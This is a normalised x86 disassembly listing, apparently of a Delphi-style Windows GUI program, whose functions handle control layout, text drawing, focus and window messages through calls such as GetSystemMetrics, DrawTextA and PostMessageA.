mov eax [ ebp - 0x4 ]
call sub_474670
inc esi
dec edi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov edx esi
mov eax ebx
call sub_463548
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4745cc
jmp r-xdata
mov edx esi
mov eax ebx
call sub_463548
cmp [ eax + 0x22b ] 0x2
jne r-xdata
sub_473f80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ea7c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
sub_473fa8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_470f64
mov eax [ esi + 0x4 ]
sub eax 0x201
je r-xdata
mov edx esi
mov eax ebx
call sub_470c24
mov esi eax
test esi esi
je r-xdata
sub eax 0x3
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp ebx [ esi + 0x4 ]
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x17c ]
cmp [ esi + 0x18a ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403324
jmp r-xdata
sub_47400c
push esi
push edi
mov edi eax
mov eax edi
call sub_47ea70
mov eax edi
mov si 0xffd0
call sub_403324
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ edi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop edi
pop esi
retn
sub_47403c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
cmp bl al
je r-xdata
mov edx ebx
mov eax esi
call sub_4715e4
pop esi
pop ebx
retn
mov eax esi
call sub_4700dc
sub_474078
push ebx
mov ebx eax
mov eax ebx
call sub_47c188
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
xor dl 0x1
mov eax ebx
call sub_474064
pop ebx
retn
sub_474098
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_470ed0
mov esi eax
mov dl [ ebx + 0x30e ]
mov eax esi
call sub_47334c
mov eax esi
pop esi
pop ebx
retn
sub_4740b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_474145
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx esi
mov eax edi
call sub_471d34
cmp bl 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47414c
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
cmp [ esi + 0x16c ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x16c ]
call sub_47b0b8
mov eax [ ebp - 0x4 ]
mov edx [ edi + 0x310 ]
call sub_4042c4
jne r-xdata
lea eax [ edi + 0x310 ]
call sub_403eb8
xor eax eax
mov [ edi + 0x324 ] eax
sub_474154
push ebx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x310 ]
mov eax ebx
call sub_47ce38
test eax eax
je r-xdata
mov eax [ eax + 0x16c ]
mov [ ebx + 0x324 ] eax
sub_474180
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x308 ]
call sub_455680
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x308 ]
mov edx ebx
call sub_45566c
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x308 ]
mov edx ebx
call sub_45566c
cmp edi [ eax + 0xa0 ]
jne r-xdata
sub_4741f4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4743d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2a4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4743de
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403edc
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x324 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_473ec0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x308 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x2a4 ]
mov eax edi
call sub_4634fc
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_455538
mov edx [ ebp - 0x4 ]
mov [ edx + 0x308 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x324 ]
call sub_479bf4
call sub_47a3f0
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x320 ] ebx
mov eax ebx
mov edx r-xdata
call sub_47b4dc
mov eax edi
call sub_4634fc
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x320
call sub_40d31c
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x308 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_442960
mov ebx eax
mov [ ebx + 0xb0 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x308 ]
mov eax ebx
call sub_455434
mov edx edi
mov eax ebx
call sub_455da8
mov edx esi
mov eax edi
call sub_463548
mov edx eax
mov eax ebx
call sub_442944
mov edx esi
mov eax edi
call sub_463548
lea edx [ ebp - 0x10 ]
call sub_448fac
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_455bc8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x324 ]
call sub_479bf4
call sub_47a3f0
mov [ ebx + 0xa8 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xac ] eax
mov edx ebx
mov eax [ ebx + 0xa8 ]
call sub_47b3d0
mov edx esi
mov eax edi
call sub_463548
lea edx [ ebp - 0xc ]
call sub_448fac
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_455bc8
jmp r-xdata
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_455c28
test esi esi
jne r-xdata
push ebp
mov edx esi
mov eax edi
call sub_463548
call sub_474180
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
sub_4743f4
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_436734
mov esi eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax esi
call sub_448ecc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x254 ]
inc edx
mov eax esi
call sub_448718
push 0x36
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_448740
push 0x37
call GetSystemMetrics
mov edx eax
mov eax esi
call sub_448764
mov [ esi + 0x188 ] bl
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_442960
mov edx eax
mov eax esi
call sub_4482f8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x227 ]
sub al 0x1
jb r-xdata
mov dl [ r-xdata ]
mov eax esi
call sub_4482d8
mov al [ esi + 0x188 ]
sub al 0x1
jb r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ esi + 0x48 ]
lea eax [ eax + eax * 2 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub edx [ eax + 0x254 ]
dec edx
mov eax esi
call sub_4486f4
jmp r-xdata
je r-xdata
mov al [ esi + 0x188 ]
sub al 0x1
jb r-xdata
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032d8
mov dl [ esi + 0x188 ]
sub dl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax [ esi + 0x48 ]
add eax eax
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub edx [ eax + 0x254 ]
dec edx
mov eax esi
call sub_4486f4
jmp r-xdata
dec al
je r-xdata
mov edx [ esi + 0x48 ]
add edx edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add edx [ eax + 0x254 ]
inc edx
mov eax esi
call sub_4486f4
jmp r-xdata
je r-xdata
mov [ eax + 0xb0 ] 0x3
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x48 ]
sub edx [ esi + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub edx [ eax + 0x254 ]
dec edx
mov eax esi
call sub_4486f4
jmp r-xdata
jmp r-xdata
mov edx [ esi + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add edx [ eax + 0x254 ]
inc edx
mov eax esi
call sub_4486f4
jmp r-xdata
dec al
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn
mov [ eax + 0xb0 ] 0x2
jmp r-xdata
dec dl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x254 ]
inc edx
mov eax esi
call sub_4486f4
jmp r-xdata
mov [ eax + 0xb0 ] 0x1
jmp r-xdata
sub_4745cc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x318 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x314 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx ebx
call sub_442944
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x318 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx ebx
call sub_442944
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x31c ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx ebx
call sub_442944
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
push ebp
xor eax eax
call sub_4743f4
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x314 ] eax
push ebp
mov al 0x1
call sub_4743f4
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x318 ] eax
push ebp
mov al 0x2
call sub_4743f4
pop ecx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x31c ] eax
sub_474698
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov edi [ ebx + 0x314 ]
test edi edi
je r-xdata
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47c4f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ esi + 0x8 ]
cmp eax [ edi + 0x40 ]
jle r-xdata
mov al [ ebx + 0x227 ]
sub al 0x1
jb r-xdata
mov eax [ edi + 0x40 ]
sub eax 0x2
mov [ esi + 0x8 ] eax
jmp r-xdata
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax edi
call sub_44894c
mov eax [ ebp - 0x20 ]
add eax 0x2
mov [ esi ] eax
jmp r-xdata
sub_47471c
push ebx
mov ebx eax
mov eax ebx
call sub_47c2a4
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x310 ]
call sub_404178
test eax eax
jle r-xdata
mov eax ebx
call sub_474154
sub_474748
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ ebx + 0x296 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
cmp [ esi + 0x8 ] 0x20
je r-xdata
cmp [ esi + 0x8 ] 0x2d
je r-xdata
call GetCapture
test eax eax
jne r-xdata
mov ax [ esi + 0x8 ]
test ax ax
je r-xdata
cmp [ ebx + 0x28a ] 0x0
jne r-xdata
mov edx eax
mov eax ebx
call sub_47cd44
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0x28a ] 0x0
jne r-xdata
mov eax ebx
call sub_47cf44
mov edi eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x138 ]
test edi edi
je r-xdata
mov eax [ edi + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov [ ebx + 0x28a ] 0x0
mov [ esi + 0xc ] 0x1
push 0x0
push 0x0
push 0xb410
mov eax ebx
call sub_44f7d8
push eax
call PostMessageA
mov eax [ edi + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_474864
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff5000
sub eax 0x2
jae r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ ebx + 0x296 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x17c ]
cmp [ esi ] 0xb001
sete dl
mov eax ebx
call sub_474064
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
sub_4748b4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4741f4
xor eax eax
push ebp
push sub_474901
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4716fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474908
mov eax [ ebp - 0x4 ]
add eax 0x308
call sub_40d31c
mov eax [ ebp - 0x4 ]
add eax 0x320
call sub_40d31c
retn
sub_47490c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_47eb5c
mov eax [ r-xdata ]
not eax
and eax [ edi + 0x50 ]
mov [ edi + 0x50 ] eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0xa
xor edx edx
mov eax 0x2
call sub_4170c4
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_47ffb0
mov edx 0xa
mov eax edi
call sub_480010
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
add esp 0xfffffff0
call sub_40348c
push 0xf
call GetSystemMetrics
mov [ edi + 0x1c4 ] eax
mov eax edi
test bl bl
je r-xdata
mov [ edi + 0x1ac ] esi
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4749b4
push ebx
push esi
push edi
call sub_4034f4
mov ebx edx
mov edi eax
mov esi [ edi + 0x16c ]
test esi esi
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_47ec04
test bl bl
jle r-xdata
mov eax [ esi + 0x18 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034dc
mov eax [ esi + 0x18 ]
mov edx [ eax ]
call [ edx + 0x17c ]
sub_474a04
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_479bb4
test al al
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_479bf4
call sub_47a850
test eax eax
je r-xdata
mov esi [ ebx + 0x160 ]
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x50 ]
mov eax [ esi + 0x10 ]
call sub_424758
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x64 ]
mov eax [ esi + 0x10 ]
call sub_424758
jmp r-xdata
push 0x3
lea ecx [ esp + 0x4 ]
mov edx [ ebx + 0x4c ]
sar edx 0x1
jns r-xdata
mov eax [ ebx + 0x1ac ]
call sub_47ea90
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov eax [ esi + 0x10 ]
call sub_424750
mov edx eax
mov eax [ esi + 0x14 ]
call sub_424a38
cmp [ ebx + 0x18a ] 0x0
je r-xdata
sub edx 0x3
mov eax [ ebx + 0x48 ]
sub eax 0xb
call sub_417088
lea ecx [ esp + 0x4 ]
mov dl 0x1
mov eax [ ebx + 0x160 ]
call sub_46b278
adc edx 0x0
sub_474aec
push ebx
mov ebx eax
mov eax ebx
call sub_47f940
mov eax [ ebx + 0x16c ]
call sub_479bb4
test al al
je r-xdata
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
mov eax ebx
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x18a ] 0x0
jne r-xdata
sub_474b4c
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
test [ ebx + 0x1a8 ] 0x2
je r-xdata
test [ ebx + 0x1a8 ] 0x8
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
mov edx [ eax + 0x58 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov esi [ esp + 0x4 ]
mov ecx esi
mov edx [ esp ]
mov eax [ ebx + 0x160 ]
call sub_424f44
mov ecx esi
mov edx [ esp + 0x8 ]
mov eax [ ebx + 0x160 ]
call sub_424ee4
test [ ebx + 0x1a8 ] 0x4
je r-xdata
mov eax ebx
call sub_48060c
call sub_47ea90
call sub_47bc78
mov edx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424758
mov esi [ esp + 0xc ]
dec esi
mov ecx esi
mov edx [ esp ]
mov eax [ ebx + 0x160 ]
call sub_424f44
mov ecx esi
mov edx [ esp + 0x8 ]
mov eax [ ebx + 0x160 ]
call sub_424ee4
add esp 0x10
pop esi
pop ebx
retn
test [ ebx + 0x1a8 ] 0x2
je r-xdata
inc [ esp + 0x4 ]
sub_474c34
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov [ ebx + 0x1b0 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
call sub_4800a4
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
cmp [ eax + 0x95 ] 0x0
jne r-xdata
mov dl 0x1
call sub_455c28
sub_474c88
push ebx
push esi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x1a8 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
mov esi [ ebx + 0x4c ]
test [ esp ] 0x2
je r-xdata
test [ esp ] 0x2
jne r-xdata
test [ ebx + 0x1a8 ] 0x2
jne r-xdata
test [ esp ] 0x8
je r-xdata
test [ ebx + 0x1a8 ] 0x2
je r-xdata
inc esi
jmp r-xdata
test [ esp ] 0x8
jne r-xdata
test [ ebx + 0x1a8 ] 0x8
jne r-xdata
dec esi
mov eax ebx
call sub_48060c
call sub_47cf0c
test eax eax
je r-xdata
test [ ebx + 0x1a8 ] 0x8
je r-xdata
inc esi
jmp r-xdata
mov al [ esp ]
mov [ ebx + 0x1a8 ] al
mov edx esi
mov eax ebx
call sub_448764
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp ebx [ eax + 0x40 ]
jne r-xdata
dec esi
inc esi
sub_474d18
push esi
mov esi eax
mov eax esi
call sub_44ad10
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
retn
mov eax [ esi + 0x16c ]
test eax eax
je r-xdata
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ esi + 0x1ac ]
test eax eax
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax esi
call sub_48060c
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ eax + 0x2c4 ]
xor edx edx
mov [ eax + 0x28c ] edx
mov [ esi + 0x1b0 ] 0x1
jmp r-xdata
sub_474da8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_474e08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_480620
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_448fac
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_45e254
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x1c8 ]
call sub_403f0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474e0f
lea eax [ ebp - 0x8 ]
call sub_403eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_474e14
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_474eae
push [ fs : eax ]
mov [ fs : eax ] esp
test bl bl
jne r-xdata
mov edx ebx
mov eax esi
call sub_47ff0c
mov eax [ esi + 0x1ac ]
test eax eax
je r-xdata
mov [ esi + 0x1b0 ] 0x0
test bl bl
je r-xdata
mov edx esi
call sub_470518
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474eb5
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
mov eax [ esi + 0x16c ]
call sub_47b0a8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46a1b4
mov eax [ esi + 0x16c ]
call sub_47b0a8
mov eax [ eax + 0x7c ]
lea edx [ ebp - 0x4 ]
call sub_446090
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_469e1c
jmp r-xdata
sub_474ebc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_480178
mov eax ebx
call sub_48060c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_48060c
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x2c4 ]
test edx edx
je r-xdata
cmp [ edx + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call SetFocus
sub_474f1c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_4801ac
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
cmp eax [ esi + 0x16c ]
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov eax esi
call sub_48060c
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ esi + 0x1ac ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x28c ]
test eax eax
je r-xdata
mov eax [ esi + 0x16c ]
mov eax [ eax + 0x18 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax esi
call sub_48060c
cmp [ eax + 0x296 ] 0x0
je r-xdata
mov eax [ eax + 0x16c ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x40 ]
jne r-xdata
mov eax [ esi + 0x16c ]
mov eax [ eax + 0x18 ]
mov edx [ r-xdata ]
call sub_4032d8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ esi + 0x1ac ]
mov eax [ eax + 0x2c4 ]
xor edx edx
mov [ eax + 0x28c ] edx
sub_47502c
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx eax
mov eax ebx
call sub_480724
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov esi [ ebx + 0x1c4 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov eax [ esp + 0x4 ]
cmp eax 0x10
jle r-xdata
mov eax [ ebx + 0x1c4 ]
mov ecx 0x3
cdq
idiv ecx
mov esi eax
add esi esi
jmp r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov esi eax
add esi 0x4
add esp 0x28
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp eax 0x10
jg r-xdata
mov edi eax
add edi 0x6
mov edi 0x18
jmp r-xdata
mov edx [ ebx + 0x19c ]
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push edi
lea esi [ ebx + 0x190 ]
lea edi [ esp + 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax esi
sar eax 0x1
jns r-xdata
sub eax edx
dec eax
push eax
mov eax 0x18
sub eax [ ebx + 0x190 ]
push eax
lea eax [ esp + 0x10 ]
push eax
call OffsetRect
push esi
push edi
lea esi [ esp + 0x10 ]
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
push 0x0
lea eax [ esp + 0x1c ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_4170c4
push esi
push edi
lea esi [ esp + 0x20 ]
lea edi [ ebx + 0x1b1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
adc edx 0x0
mov edi [ ebx + 0x198 ]
add edi [ ebx + 0x190 ]
push 0x400
lea eax [ ebx + 0x1b1 ]
push eax
push 0xffffffff
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x54 ]
call sub_404378
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawTextA
mov eax [ ebx + 0x194 ]
mov [ ebx + 0x1b5 ] eax
mov eax [ ebx + 0x19c ]
mov [ ebx + 0x1bd ] eax
mov eax [ ebx + 0x198 ]
add eax [ ebx + 0x1b9 ]
add edi eax
add edi [ ebx + 0x18c ]
jmp r-xdata
push edi
push esi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_4751a4
push ebx
add esp 0xfffffff0
mov ebx eax
